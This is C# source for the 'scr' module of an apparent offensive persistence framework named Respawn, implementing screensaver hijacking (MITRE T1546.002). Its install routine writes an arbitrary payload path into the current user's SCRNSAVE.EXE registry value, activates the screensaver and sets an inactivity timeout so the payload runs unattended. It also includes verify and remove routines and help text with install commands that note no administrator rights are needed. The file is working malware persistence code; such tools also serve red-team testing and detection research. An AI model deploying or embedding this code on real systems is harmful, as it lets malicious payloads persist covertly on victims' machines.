using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.Screensaver
{
    public class ScreensaverModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "scr";
        public string Name        => "Screensaver Hijacking";
        public string Mitre       => "T1546.002";
        public string Description => "Persist by abusing the Windows screensaver mechanism, modifying the current user's registry to execute a malicious payload disguised as a screensaver executable (.scr or .exe) after a specified period of system inactivity.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath          = @"Control Panel\Desktop";
        const string ScrnSaveExe      = "SCRNSAVE.EXE";
        const string ScrnSaveActive   = "ScreenSaveActive";
        const string ScrnSaveTimeout  = "ScreenSaveTimeOut";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p2", "keys");

            // 2. OPERATIONAL NOTES
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  OPERATIONAL NOTES:");
            // Console.ResetColor();
            // Console.WriteLine("    - Payload executes after the inactivity timeout");
            // Console.WriteLine("    - Works even if no visual screensaver is set");
            // Console.WriteLine("    - No Administrator privileges required");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to target .exe or .scr file");
            TechniqueHelpBuilder.RenderOption("-i,  --interval", "Timeout in seconds (e.g. 60)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t scr -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t scr -a install -p \"C:\\p.exe\" -i 300");
            TechniqueHelpBuilder.RenderExample("Respawn -t scr -a verify");
            TechniqueHelpBuilder.RenderExample("Respawn -t scr -a remove");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return ScreensaverKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Fail("Failed to open Control Panel\\Desktop registry key.");

                var existing = regKey.GetValue(ScrnSaveExe);
                if (existing != null)
                    return TechniqueResult.Exists($"Screensaver already set to '{existing}'.");

                // parse timeout — default 60 seconds
                string timeout = "60";
                if (!string.IsNullOrEmpty(ctx.Interval))
                    timeout = ctx.Interval;

                regKey.SetValue(ScrnSaveExe,     ctx.Payload);
                regKey.SetValue(ScrnSaveActive,  "1");
                regKey.SetValue(ScrnSaveTimeout, timeout);

                return TechniqueResult.Ok(
                    $"Installed screensaver payload '{ctx.Payload}' " +
                    $"with timeout {timeout}s.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Fail("Failed to open Control Panel\\Desktop registry key.");

                var existing = regKey.GetValue(ScrnSaveExe);
                if (existing == null)
                    return TechniqueResult.NotFound("No screensaver payload set.");

                regKey.DeleteValue(ScrnSaveExe);
                regKey.SetValue(ScrnSaveActive, "0");

                return TechniqueResult.Ok("Removed screensaver payload and disabled screensaver.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegPath, writable: false);
                if (regKey == null)
                    return TechniqueResult.Fail("Failed to open Control Panel\\Desktop registry key.");

                var value   = regKey.GetValue(ScrnSaveExe)?.ToString();
                var active  = regKey.GetValue(ScrnSaveActive)?.ToString();
                var timeout = regKey.GetValue(ScrnSaveTimeout)?.ToString();

                if (value == null)
                    return TechniqueResult.NotFound("No screensaver payload set.");

                return TechniqueResult.Ok(
                    $"Verified screensaver payload '{value}' | " +
                    $"Active: {active} | " +
                    $"Timeout: {timeout}s");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}